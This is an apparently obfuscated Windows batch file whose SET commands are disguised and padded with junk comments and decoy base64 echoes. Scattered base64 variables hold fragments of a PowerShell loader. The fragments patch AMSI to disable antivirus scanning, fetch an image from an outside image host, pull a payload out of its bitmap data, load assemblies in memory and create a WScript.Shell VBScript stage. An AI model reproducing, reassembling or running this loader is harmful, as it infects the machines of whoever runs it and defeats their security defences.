@echo off
REM cipher valley kappa ruby binary zenith
REM cipher cipher shadow
REM zenith pixel beacon
REM undergrowth guard twilight
REM undergrowth beacon cipher guard ruby hawk beacon delta core zenith
Se%wuC%t "pk_TBVX_0027=vbWFpbl06OkN1cnJlbnREb21haW4uYWRkX1VuaGFuZGxlZEV4Y2VwdGlvbih7IHBhcmFtKCRzLCAkZSkgTG9nLVNpbGVudCAiW0ZBVEFMXSAkKCRlLkV4Y2VwdGlvbk9iamVjdC5NZXNzYWdlKSIgIlJlZCIgfS"
REM sword twilight kiln core vision
REM circle lance odyssey phantom
REM clearing clearing ruby fragment vision pixel ruby undergrowth
REM fathom binary cipher undergrowth pixel echo twilight fathom core core
REM kiln fragment core pixel hawk fathom vision
sE%mYlGi%T "NgPowlVv=udHqSPwHKFzLEUjQSZTpavXLkKqcFbbf"
REM sword core hawk kappa clearing guard phantom
echo bW4xYlR3RHA3b1pMQUlTTFhHUnhrMzFxQzQ1TFZKdWJYT0VxbU1MbzU3SFdxWEdVanNEQWJTUlR1VUtwRg== >nul 2>&1
REM kiln glimmer zenith ruby mirage sword vertex binary
SE%wbC%T "atlXncibL=aPVztCmrkgJF"
REM vision beacon pixel vertex circle
REM echo core ruby sword
REM phantom mirage pixel
REM phantom guard circle guard lance twilight
Se%BBZq%t "rrZuxZApqltTU=DMCEzdkgNXpDFxBHgPsZGeTMS"
echo VUxoazh5MzR2cERQa1BzWFIxR2g3ekl5cElvdEdXSkNCdTZEYWNGTlMxWElrSQ== >nul 2>&1
se%uMoa%t "ruxcFYcHDXA=ThpJGCijEEhmU"
echo a1J3ZHZJYnhaZUs0azVkbWhiOTZSTmVGZzFFTkhjMzEzQzlPTGhadkQ4Z3pzdQ== >nul 2>&1
se%lhUr%T "ceUTnyt=pghntLJiPZpPRqKmZLsnt"
REM clearing beacon ruby zenith ruby strobe hawk vertex core
REM vertex twilight twilight strobe twilight phantom zenith
REM lance clearing valley
echo Umc0Mjg4ZE1RNmVWODVaRmUzR1JobFZBa0xIeHM1OEJpck54ZUQzSHk3RlVN >nul 2>&1
REM valley vertex guard vision echo lance
REM glimmer binary circle binary core sword
REM vision cipher beacon phantom phantom odyssey twilight ruby
sE%DAI%T "GFrNkl=zFKYWjeghjYMARAHQV"
echo b2NsbDZIbWl6aWZMcDlnSlNJTFVhQUczZ1VDRjVJYUZDNkZvU2xhTVNyaWVLZzVYQjZ2b2Nwb2xudElHeDZkVkkyNjA3OW9Q >nul 2>&1
REM clearing vertex twilight vision
REM cipher glimmer fragment
REM valley echo ruby valley delta echo circle beacon
REM valley fragment kappa odyssey echo sword fathom
echo c3FnREhVSk51MWNSd1pxMEhnWEc0SzRpMmNoTUwyNUU5S2VUZnZCY1d6c3lxbFQ4cXpjWWxU >nul 2>&1
SE%TYot%T "sbmSwBdxLTQ=jIQjBqeKcn"
echo OEU3eE9Mdm1qQzNJNnNXUnlZcERkWktTcmtMczVWbFRsYktISXQzdTkwTXBqbVhiNndPSEdVNkxMcUxvYTcwVTZETThWdU55V0w3OGc= >nul 2>&1
REM vertex vision beacon
REM undergrowth clearing strobe undergrowth phantom beacon mirage phantom lance vertex
sE%ORY%t "dJZnYssafpgkHiz=XhsoDmmuYGBrdNySdQnKxUDkbOoAiTTMHBk"
sE%KoP%t "AiJxyC=pGqqXliKagzyUQsrKTihujkvpzglGP"
se%CQmHb%t "EuLmUyjlmWBZ=PZxpZslYjRKajXDyZalLICB"
REM hawk core core fragment
se%Aplh%t "pk_TBVX_0019=nJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyBbaW50XSRfIH0pIC1qb2luICIsIgokdmJzQ29udGVudCA9IEAiCkRpbSBzLCBmLCB0LCB1LCBjLCBoLCBhOiBTZXQgcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOi"
se%hGdLr%t "CDqsyvaVutZpnQ=LuBCwQcAaudHJjPTHWiAgayxPpPgEf"
Se%BRj%t "HMcoucR=pLMyDOzGUENDHziTGsgevxDmYlqQ"
SE%DhHC%t "rGgxwsoebchUFE=HHXLNDhlyfty"
se%LXR%T "IukcYDbWiXMo=eTTqVZAllkOQDGrURmbMtroCppTGNqLpGJL"
echo amk5MUs3UEgxNTUzUU03VFlpSkFyNTMyMjg3M2lYaTAyYUQydDhHZDhqU2pJektHMQ== >nul 2>&1
REM lance pixel odyssey valley zenith undergrowth phantom
REM ruby guard hawk phantom delta shadow
REM guard cipher undergrowth mirage circle guard fathom cipher fathom
REM vision circle guard core circle core zenith
REM strobe shadow echo vision pixel kappa kappa binary pixel
SE%nlF%T "aDhsTw=dRoxkBrJdYvbrJhUXAUoLhaPWXbHWYeHip"
REM guard strobe binary ruby undergrowth strobe guard
Se%DHXfy%T "hmJAUw=nNgcRNXulwGJgohkULfGOeJDcWzaaTX"
se%pOl%t "zwLPxdHEdYXbPLy=vlxXPvwqXtIPfRBEGhfQ"
sE%QSNVZ%t "MblgkFrhb=QhUwhkHQKDRvEjucheDrGNRuRlJHNf"
REM pixel twilight fragment clearing cipher kappa clearing guard cipher
REM pixel beacon lance pixel vertex twilight sword
SE%MUpAe%T "HemqQOnOz=elMsxKDGYWZwg"
Se%WyJr%t "gTOhAxQ=stvxFGLwXHtKttK"
REM glimmer zenith odyssey binary
echo Z2hvdklpbXc5WVl0YlF1S0p3WTZPWXJDczByUXVMMHdXRTAxZGg3ZXlLaXVtenV4aXlqa3dxUUtkbHVROVlXSg== >nul 2>&1
echo eGVXQUs0ZHRxUXBiSjhNanV4ek9nV0VJSXFwcWVWRmxCWTB2cEVCNEVFOUNBblhzUE04MUlpcDhEcGtHU2g= >nul 2>&1
se%BYk%t "pk_TBVX_0015=JvcjogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiICJHcmF5Igp9Cn0KRGlzYWJsZS1BTVNJCiRJbWFnZVVSTCA9ICJodHRwczovL2kuaWJiLmNvLzhuSFpCTXNUL21lbS5wbmciCmlmICgtbm90ICR0"
REM undergrowth odyssey lance pixel sword beacon core phantom beacon twilight
REM glimmer mirage echo mirage
echo TG1YV1NMb2hveTNHTEczdDRyQlNQS0UwUmpoZlFRMFlvT1dNY3B5Z0llNnZKNkxNaGRpOU9sQ3FNQjB0 >nul 2>&1
echo ZTFUTmE2ejRLYmF6bTh2ZDQxYUYwZ1RZcnJTbmJkV1ZGNzlTeHNsUW84NUkyRUdaZjI5RHhqMkNrQnZVbXVQQnFxVGlxSmhSdWU= >nul 2>&1
sE%rxbBs%T "bhDaLbXWLhhn=trEVMufLUgEiQPJVNWrAnzT"
REM kappa ruby beacon kappa binary cipher shadow sword fathom
REM valley shadow twilight valley twilight clearing odyssey
sE%nPs%t "bndvTWeFgSqPu=mNeErdgenSubeJuENVprETOYPUb"
echo RWdwMUpESEMyVlNYMFpaa3lyMHJQb2dkYmtlUmhSeDlvNE1mYnI5Y3hoNTEwb21Ma2puVHA2dklMS2ZsVDhkZ1NY >nul 2>&1
sE%TxNem%t "VevxAgosD=AHbDfwJlRsXFma"
Se%PhTb%T "cwVzyvGzLEVyFzp=ilgmEstuClEAbByJUsdsEQbAznmeIOqVLJo"
REM lance valley ruby
se%frEnv%T "ExwIOhDD=WKwvhBAIuvoA"
REM phantom vertex kiln twilight lance kiln guard vision
REM clearing beacon delta valley binary twilight
Se%DOb%t "QRJDSJe=zApYPBXtDMJVqqdiztgbCsGtaoGOvPwrsSf"
echo WUo1Y3ZhSGhVSTFSQUhKVHBiSGJYU2xrVk82UDFPenc5bHpMRnJXZm1KTWllUmFrRnR1SVdZdlB0VWNsaUgyNXZKZjNINDRmY25j >nul 2>&1
REM vertex odyssey beacon sword twilight echo beacon fragment
sE%jLL%t "aZAKWmSH=WDqmyPxLPZaqnKeezpmXe"
SE%Pib%t "rOnbScbqp=upgVgolGlKRvBBlKHbrGja"
sE%VPPSk%t "pk_TBVX_0041=8oJG91dE1zKQokcmF3UEUgPSAkb3V0TXMuVG9BcnJheSgpCiRtc2NvcmxpYiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtY"
Se%NuJWe%t "OwSszpda=jmjrfQmIaNKnHKogtgygAnbrWdtPlGPIp"
SE%IvP%t "RgZlMNKHeWpUwWR=ihfBMUBFLUFPRrrYzyTBEX"
REM binary clearing vision shadow kappa circle ruby hawk twilight
SE%kgpy%T "lZEaXWz=FpIgtHBuQznDJcCUefh"
REM hawk clearing kiln vision sword vision
SE%ThL%t "bLGKlnoHyDRIqFa=ASMvynovsSubqgvzWBft"
REM strobe pixel lance echo fathom fathom delta
echo ZnBTMXZCcEE3UGVzS2JFa0ZvY1g1cGpNaFV6b28wMUdaemR3UGhqQmpMc3c2RW85R3cxeXNiTGx2eXhtT0JsYkxBaXRKM0F1RG50Z0g= >nul 2>&1
se%SjyB%t "xcAlbErLhLeh=xymIDTEdYvUckJdYziJqEET"
REM fragment core delta core fathom
echo WVJycDJtT2gzSjJtWUlBZjNrTGtRU0dkd0tiYXBiU1IyblJLWGVISEpmUG1GQmpyS0RwalRyUWRxRFBmUmNUTFY1Ym9ORnQ3eXZGQ0lNWg== >nul 2>&1
SE%mSZ%T "bTZUzhBibGC=jthuwKVjUiPOkoceBYvSRiRacAUO"
REM pixel zenith core echo beacon shadow shadow odyssey sword
echo WnlIUFJPcXN5QjZWS1N6VVU0WmFocFdTY1JUanVwZmpjakgwdWI5QWtGa21CS0JQMDE3WlFv >nul 2>&1
sE%HTBvN%t "knPPpCBZCqQir=IlypaSJkwUyhokf"
se%Sky%T "VznJfMOjhqzW=AAcdSRYlAuyGTVkWdYrrdoumHTJKdXfLKAn"
REM strobe odyssey kappa strobe phantom fathom
REM sword undergrowth cipher sword
se%XIPu%T "NMWqJPkgy=rJxSwmgTDmJZ"
echo TWNYTUFleWM1Y3VURW56OVhQcU9SdVphdzVxaHlZWjhaS1YyTWlhc3BMb3dEaQ== >nul 2>&1
REM binary sword binary mirage ruby undergrowth lance valley
se%sMioc%T "DKXWhygB=mVKpiXNNXzIunTEmHvONpwc"
echo NW1PWUc1N0dxQ0pma21uc1dYYzZncXhGQUVGYWhZakpZT3RHMWFhbnhMSjIzTHJ5VU05M1ZwMWc5V2JxMA== >nul 2>&1
echo andoZEpxc0N4ZE15NnBuMkJJbE5YOUpXMmFVaFFWM1BSdVZjNUpUWHZUOENuQ0p6MFRud0l6bmV3eWxPM3A= >nul 2>&1
echo TUFFVjJvQ0hlN3BXVnZiTjh0b0puSVUxVlpmaDJVMG9hdnJpRVpRM2FzbElJeXE1WDJNbXI0RzVVSVVkT3dReDJFemd5Nw== >nul 2>&1
REM kiln kiln undergrowth undergrowth binary shadow
REM glimmer echo vertex vision odyssey vision binary delta mirage delta
Se%BmkqA%T "DtjEQaHLXvs=zFiZQTJMJEgMtUlLZcIdIPkhncffQRRr"
REM vertex odyssey kappa beacon valley odyssey
REM odyssey zenith kiln zenith fragment
Se%kqotl%T "dSAIYiAVRz=DbDunupDAfoFDnMsYseJtDAjaFl"
REM echo odyssey ruby valley zenith vision beacon
REM kappa kiln circle sword sword core shadow
echo VmpyNGN4UUE0cTBZUVM3R3dZa3ZqU0ZPeGY4eEJrT1BFdmlUejdZNA== >nul 2>&1
echo ZkVWd2xwdnR3ZVJVcXJsWmo3VnRvTmVJc01ta3BYc0tXSTh5c2tkcFFMU1Uwbm4= >nul 2>&1
REM zenith glimmer beacon guard strobe pixel binary shadow
REM beacon vision echo shadow lance zenith odyssey lance sword fathom
echo bXlicDVJUkhmRUFFUENCQUxBaTRXYmFKM3diUjUzTjc2SHJtb1hDckY= >nul 2>&1
REM hawk hawk beacon pixel fathom
echo bjZ5STdlbzhqdmVQdEs0aEVMbHRtaUVhMVZhRDZMeklqN2pkcGltbm9nU0p3dDdacmx5QkFtM3RNTTZYMg== >nul 2>&1
REM pixel vertex zenith mirage cipher twilight ruby kiln
Se%lbOp%t "pk_TBVX_0004=CkxvZy1TaWxlbnQgIlsrXSBBTVNJIGluaXRpYWxpemF0aW9uIGZsYWcgcGF0Y2hlZC4iICJHcmF5Igp9Cn0KJGNsYXNzTmFtZSA9ICJYUF8iICsgW0d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmco"
REM valley kappa lance echo beacon zenith
REM sword lance twilight phantom core fragment echo
Se%jzLtX%T "XeLmnFacygf=xaQlGKjJRGMqDZvFVbh"
echo S3o2cmxpTEp2NldtTzZXMVZINTdBdnFoTHRZbEVTYmt2U01lWHJZcUxGTHJlYjhqWm4= >nul 2>&1
REM binary circle lance echo
echo bzRpT1FUSzhXMlNTUExIOElLbkhaZEw3Tm5SaTBIMGlOSE5iWm81S3AyN1l6dTNMNw== >nul 2>&1
REM undergrowth strobe circle pixel pixel fathom hawk fragment shadow
sE%ksE%t "EXrrCQdxoOOig=GiMeFSUYktsWWn"
echo NmdYVVFFcFpidldpdDlIS080Y21GQ29CSHFPNE90OHNpMTlwbzZYNElaTEVkNkxEVHdweDQ= >nul 2>&1
echo VVVMU2ZDczlXNTdQTXJ5VVRhOUdnQ1NBWkRHSXpQQmx6RE5uQ3U5Mk94VldHQjhhZUdvTGpxZ1kzVURSaW1EeFQwamU= >nul 2>&1
Se%DZZh%t "pXahMITZloGXT=TfkRUthMdOHVZNjcPoBrCmPORRgK"
sE%ghWNT%t "gTiJAKOuLNGizd=QSBEWtPKSPKxMYJHTIaaHpCJFZmTBkAT"
SE%STfUx%T "OdBdYC=mMgqPTYBRhsakykctH"
REM echo phantom valley clearing binary odyssey guard fathom twilight
echo TmlrVTZUV3AxNnloRnJmZFZ3T2NUVWhaWTRrZnFZaFlBekd3bjYyOFlrdlFBazNEcXZBOFVWT25INDJBQWlHMldMcFFwU2k= >nul 2>&1
SE%qPreh%t "nJmYlqLwzBBe=HwCXodpFgqeyufbIEKOcmhFcnfw"
REM valley kiln shadow kappa clearing delta undergrowth
sE%cNBaG%T "VkbPUoUfeIJ=CyHorhxKqclDPbtNekSdrUeTUqYNqWr"
REM kappa lance valley pixel kiln pixel vision circle lance vertex
echo Q3E5Q3R6V3JjMjZtU1EwRnRieFZnZ2ZXbG1ocGtxbEUzWmhoV0JTeHpLa0lKaEo2QzQ= >nul 2>&1
REM pixel kappa binary kiln
Se%JiTw%t "pk_TBVX_0003=0b21hdGlvbi5BbXNpVXRpbHMnKQppZiAoJHApIHsKJGYgPSAkcC5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCAnTm9uUHVibGljLFN0YXRpYycpCmlmICgkZikgewokZi5TZXRWYWx1ZSgkbnVsbCwgJHRydWUp"
echo b1BLTkhpT1Q1QW1BN2publNUMTV4bUpJYzhhUWNmaWVxN05ZRGY5d1JqV0tMRXcxMjR4QjRuUGI4VA== >nul 2>&1
Se%VVsfd%T "QfkptqncN=xrqFGkcJpDtBUtxSeFDyudaHUuZHm"
se%QJc%T "LipvpuBlN=XxlOCUNlUdusPIuk"
REM hawk cipher ruby vision guard fathom vertex circle
sE%xTZr%t "AJeHonJcBrFu=npWQdqAqkCJxY"
SE%aKgY%T "LFFDCvTDUp=nTknESnxlzzgBmbxZxYuYBBJAVyB"
SE%MxLqR%t "TQGFbYoGbaKxutn=wZlSPNQAJEadUqlotIaesJzjH"
se%mjWEn%t "eTjZOdWoQdif=vCkGQLnGyaEglcd"
REM shadow clearing twilight cipher guard core
REM undergrowth ruby cipher twilight vertex delta kiln
REM valley lance zenith zenith
REM lance sword pixel binary guard sword
se%fnpq%t "jEpzNgUqDp=aLzPxmPYRqGsUkTfF"
REM twilight fragment kappa kiln twilight kappa clearing
se%PWiO%t "mQjMzSB=LWIAKuQZmjIuBYueiJFgoVWRczYQxaK"
SE%hASTb%T "zJdiDq=ZIiQAPspmDNBymgYQChcWq"
REM twilight twilight clearing pixel delta guard valley
REM kiln echo mirage beacon core delta ruby
echo aGhYVDhhaVBKWDhQbHdSSEw3MExjbVE5dzlMZEd1Y2lObXpyZWxrZThsWlpv >nul 2>&1
REM vision pixel strobe shadow fathom echo valley binary
Se%ufh%t "UICVXgoUwFQIhR=pjLsQuxfHrpydejuSJOAFJqKbRjFVJca"
SE%WAMq%T "VRapSoalZFM=CdMaJTXmTdxomliuIswjKvKeVncGFZcvp"
Se%eLoKv%t "zZUjxirMEcsHB=beqMXzHlDBfFzkCtcphjjipcGsO"
REM circle clearing kappa shadow vision
echo bjE4TkZxSlJIZFB1YUhSMHp2ZmtsUEJKTWFTcXowN1J0clA2Zzhma08wbTh1S2hHMnY3cVpER0pBcTYxTEhTZWJqVDVyeTR5 >nul 2>&1
SE%ofxMl%T "dQjoZvrni=FmeZeEVyhrxSORVYpSPkxfGAyYa"
echo cndUNkYwQXRBM2NkSVh2clRnWmJNVTBxRTdSSHcyVXV4RjNLSHFCQWR2aEk5R2lPUU1RM2hYOGpjUURTS2xJeWdr >nul 2>&1
REM beacon phantom phantom vision sword kappa binary valley strobe core
SE%pZhS%t "DUUdJGQiwD=cicYvDBjTThTtXQ"
se%FsDGd%T "qgryqpAfzMi=NKxnBwaTSVvPbahqfkdiqarFubwJIjkX"
echo ZFgxMW9hNXJwdFU5NGNsZ00xbW9TOUo2aTE4Rk0xcHBYMm9XdHB5M2hkUlVZS3k= >nul 2>&1
echo MG1qb3ljV1Zyd2VxdFBWdjNlckNUdVNnNlhlWGVNYkxtSVhiblg2UldnN2dwZQ== >nul 2>&1
se%nVGO%t "pk_TBVX_0002=0kgewpMb2ctU2lsZW50ICJbKl0gQXR0ZW1wdGluZyBHaG9zdCBQYXRjaC4uLiIgIkdyYXkiCnRyeSB7CiRwID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV"
REM clearing phantom shadow sword glimmer strobe circle sword
SE%KKXLl%T "ZezyfxY=yOjcmzYAqTHuiDDsdCbscPmymPI"
REM valley cipher mirage circle echo kiln cipher lance delta core
REM shadow vision ruby clearing sword phantom glimmer kappa
REM valley twilight kiln twilight fathom hawk twilight
sE%KNO%t "PoGEVSezwYmWg=OTrSybuqrHbYssYzbjIWZRc"
se%gYfPC%T "DpGoYGwVzvxG=SOzvYTyxzWUmzdQkle"
REM lance valley cipher fragment vision
SE%iput%T "pKdhIkV=AehogDiruBdHeAQeDRIwsL"
sE%YNu%T "fyDtTVOnw=fHlIxvzwpwfUjYky"
REM undergrowth binary cipher twilight valley pixel
sE%DXpjk%T "qOFEFukLRhDyoCA=civlmLNdEFndtsz"
Se%rfCu%T "hbGlrjwWmtYb=xtvVIgeRqIOQIUeVbgeyeOOSR"
REM core hawk guard fragment
REM phantom echo beacon phantom cipher
REM kappa mirage strobe vision lance cipher pixel lance
sE%xrd%T "TIHIivGMgd=dLPsVdQNxjgoDPdNpb"
sE%dyNpW%t "VgMafkjjjw=EYwkZZUoYjgPCZKAsTZhWCOq"
se%NoYKC%T "otLCkDkoIOC=usmzZATMUwfnouhlwjubDBRFCUrQ"
sE%HgEIl%t "JCCMjTHZpJ=NxYuNYvuDsICDOqARLapjZPRzRvjVaoVZs"
Se%CHQm%t "KRIwRKW=HquoVEOzhUuKWPzokbURuZDHVxqxW"
REM mirage odyssey undergrowth echo beacon odyssey
REM sword pixel cipher mirage
echo cHRsMWxaZzhiSEo0SFNXNXA0VDJ3OEU2c3pMOFAwSFp6Z2I1SGpkRE5JWVNuRjA2M25pTVowV1kwbFVrVWlGSGZwTU5CRm8= >nul 2>&1
REM valley fathom twilight
REM lance sword core twilight kiln vision
se%tRUo%T "jQNXkIDhDITxJ=HoSxPGqgBbCFZyASdASokoKZCjkPGPAHw"
SE%EcjCX%T "uKiRSKOLNYLT=ValtLDpojNDlPODOQebCeAtsjONGRyn"
SE%VOPvv%t "isHIApWeEXek=RupXvlyhtgEYyPvGzyoWkDJufnvxjdqGZ"
echo QTZMUzhUWHBMTHJQa25pTDR4NU9CM3Bpck5qTGV5REhubFhIdWppdjgzTTd0Uw== >nul 2>&1
REM fathom sword strobe zenith
sE%yopCm%T "FvpvoUxwsTZWWQ=CYumhLzEZUNeoXDrJFDwcWmUeprAdZPM"
REM echo ruby kappa vision
REM sword beacon strobe beacon mirage odyssey zenith mirage
REM pixel twilight phantom
sE%MbIwQ%t "aCekUmBsfUOj=LxPMuSjasxoUCwkMRrbtqCZCVyPaTSTY"
SE%aqRY%T "iALgehBcLmYudPp=LuIJKiaJlHproRdHFQ"
REM pixel glimmer undergrowth glimmer kiln
sE%ALeW%t "HgsIYTbWZi=AoeDJdoDQpaLpyCIUtfcZbKRlcPzSCkfo"
se%jUpQU%T "HhinGpzbGzAD=LZpIeiMityGodaYeNMRlAuydsrYIAEqAQHr"
echo TkFnZE5sUmZadk91dnVQbVY2cG9QZ3VxREhYSzNScFNEbmdXOG8yR3NnbmlmVHVGV2ZHWWw0S2JyVlQ4MXA2 >nul 2>&1
Se%LgAz%t "kBMqZKVSmjQI=BlxLLNFepLHKDaqexOeHDqjwkJi"
se%xRin%t "oLxrkGwFGG=TtvcrnFfLszVkBHKiQ"
echo Q2ROTzBpMXNwY2xJSW1OMldWZTh5bG1UV1lwVDZLeFVlNGdmVjBITkkzQVNWSmlIUGFWU2hEQkFJWkdhOGNET1J6azZFNFdrREVTTUo= >nul 2>&1
SE%aRcWd%t "XPUehgObCrPGXmR=LrdEeznAowiKBqqvQg"
Se%fqGxW%T "FtHowUmy=vMQuqAXYiEmtVfMmaDUregHWD"
REM odyssey beacon undergrowth
REM binary twilight odyssey twilight kiln
REM cipher fathom shadow zenith lance circle glimmer circle core shadow
echo aGcwalJFbVJCUVBCTlBDMENZbXczendNMlN1ZEk3SzQ3dldPdFZUdG5vT1VmRkh3b1A4TlljNlNTMG5WQTFXUzVOUXM0VnRo >nul 2>&1
se%tRhYl%t "lZbSnpqNMKNCBt=AsylyVXtNouiRJKByUrWtsQpdrY"
echo dTJXd2pJWE5VUEg3UW9BRTNOenFVdzFCbWwxbHdzbXV2MjVQMEFpZ3owTXpUV2xDTkhyb0tBMU1LSU52MHE4TU1R >nul 2>&1
echo NVNOODB2SGdtSTVwNlpNbUI2RUhOemkyWWNvVVBwcW5OdDU2MzVJZlhyMVFwZlo0Y0dqTGczUmRJRmVZ >nul 2>&1
sE%AFnB%t "pTdiDHwgVHqZ=mxWpZSpMeKCefa"
SE%iPUpz%T "MovbzHAN=QALjVyyUmfviYLT"
REM lance phantom odyssey mirage glimmer
echo d0hCUzR2UFpKeWpwVzJQNlUwaHRaQk9tcVlwWFpwNXNRUUs4VmN4TVZNNEVka2RJdGRFRnRFU2c4RzFyam5jbEhTcW5PbFR5U3k2NA== >nul 2>&1
Se%RAKG%T "cYFRuXzTkFC=MUsophqyOdkdfGiSljOKpSWpoIX"
echo QjBMTlk3S2FhUzh4VkxkeHZvQzhXRVZ4SjZPWDhsM2g2MXBlMEVKNU1lMGN0Mk44ekJFQWRqNGlwUk9x >nul 2>&1
SE%piyf%t "eXxzgCXkAAGsCT=atjaeFWouihfEFbeix"
REM kappa zenith undergrowth guard cipher twilight vertex vision
REM lance twilight pixel
Se%cSks%t "fhOvuDTOrHCrzt=aPfBuIfGmMDmM"
REM odyssey valley core glimmer undergrowth undergrowth zenith pixel valley kappa
sE%PBk%T "BwxzeDQdOZzEjnb=awKuwavddzNAHunJUrJWpQrUDSoDIxn"
Se%xpwm%T "YLRmcwWcokRXCq=ldlZImZmXdgtqVBEniS"
echo SFl1T0c2aWI4ekpqRTNXdzBabFFobjAwcEdaREdzQVBFTGxybTd5b1RYQ3dPUEVHaWtVdG03bE9EMFQ4WGxzTg== >nul 2>&1
echo eXh6aTBTYmdzYUdwMlFIbXJJeERiWjNHcDVCTzFwbFUyTlVjZEVPdjVqWUV4clo4d05IdDlUZ043UGMzanprV2NWU3Ax >nul 2>&1
Se%ebD%T "TQnmIh=uigiLSuPTZARBXAtJqPsFchwZvyIMbsI"
echo RHBJNVk2dTc4dHlwZnlqdDMxWHlrSWg2cXphV3U1ZVJaTlluekY3clVvd2JObFZIWTVtM2cxaHJaRkIyd1pDM3VyRg== >nul 2>&1
echo RWdzblBTbUJ5NEhtSHZlNFZJZU5RN1ZpWjVnQzI0TTRTWG1tTnl1Tk01Y2FoNE5BOWhGSHls >nul 2>&1
Se%tQJ%t "jNYhteYscQZxg=KcvUMMDxZsfmSvhMxZmlhfy"
REM hawk kiln beacon core
REM valley kappa shadow clearing ruby cipher glimmer guard echo
REM shadow undergrowth delta hawk vision echo delta pixel
echo VGI0V3g3ZUFuWXpHamluSm03cFdmZGhTQTkzSGZIZ3JiWFBGcmJOSUd4ZjJKSUpqVmh3WU9VYW9qWWcxdlA5c1NwUnZjN3E5TVU= >nul 2>&1
echo ampIMHFNaDRUWlVoNU1VR3ZraThBekN5VWE1OWdaS1c2WXU5SjlXRzRaZ0U5cmJVV2RoMkpwc1Y1cllqSDE4ZVJiOTNQMHN3dnk= >nul 2>&1
Se%QCGbU%T "aXywMNn=kCeSbfIJGMhpQYgjjWARrSy"
echo ck90OVlqT3RCQ2F6WndqZG9ISlIyeXBTWFNqZ2VlQXBtdkRuTUMxTWQ5VENjRWgzUHVqNndMYkVEY2ZRc0k3eTVrVnVZdmxjbVk= >nul 2>&1
REM strobe vision phantom sword glimmer shadow clearing vision
Se%mwBkF%t "NLNNnUo=jLFsPDtOdnAZTYbcAneLJJatkbUo"
echo QU5yNW9CWDhaTEVkczBHSzZFQUVNVm9PZVFZUWZTMjVGdWplQnBmRW0xSzlvVDBhMEN6ZjJtM3ZmT3Nlbm9FZzduTmswd080UG85MUM= >nul 2>&1
SE%MBvC%t "jqZcTIBld=nTcvfehnacjQhfyPapzcXxbqzVZnsTg"
echo aDVibUE4Sm11VzNIQ29YV25zV0lFaVh1TTU0Sm5vVk5CVVFMQmhScXBzSTJrYldRRmJvMUVWRGtoeXdzRg== >nul 2>&1
se%UpC%t "bOJnGM=VlbFSbuzUvugpuBNBFTIeTjozOtIAdDr"
echo cUhHVzVkZ0l0MEpZUUxUS1VhaGRWTW5rQVZvSHFidjR2MGxZbm5EV3piSXVvSnJJWGpCaGhIa2ZpS3VK >nul 2>&1
echo VjdQU0ZXSmdFaG91c0lyWFlHdHFrNk5ic3kwVWNxQzE1ZEhSNlFSQlg0WU9LS1FHUGh5WGJHU28wQ2dqbmpsRm9RbEEwbTJoelhFelVpMA== >nul 2>&1
REM pixel vertex clearing hawk clearing clearing valley
SE%JvG%t "pk_TBVX_0031=GEgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFNvdXJjZSkKfSBlbHNlIHsgcmV0dXJuIH0KJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkZGF0YSkKJGJtcCA9IFtTeXN0ZW0uRHJhd"
se%jCa%T "ChfrYldMrQUG=KALKQDfjZQc"
REM phantom odyssey zenith
REM sword sword kappa kiln
REM cipher odyssey odyssey zenith clearing vision sword
SE%JjMc%T "lUXdbDWcTZYyJDc=CARanYzFeiQknDmdOhdsdRIwOMHt"
SE%lwRUQ%t "GGAUrOfXv=uRBbJAOPqszvJZqlxBbSeGyugPjZqU"
echo Mk50ZEVIemNlMmFNYlhpOGZqQUhGWjh6bjFWM3JmWXRGTFZRNmxBN3VoZ1IxZUh0UmQ0OFlH >nul 2>&1
echo NXV2eFJ0bWVtejVObzJMWFVNTXZyNVJrbnhZWXg0cnZKZGhkcHlCbWRIOW1pU0R3Yw== >nul 2>&1
sE%XwIB%t "bAKwRlNKRFcviP=ihKvFnMMVCGspv"
Se%nbjZN%t "MUpydkzNpkR=WFUenzusiGPjKJCERJAL"
REM vision phantom mirage twilight lance cipher zenith
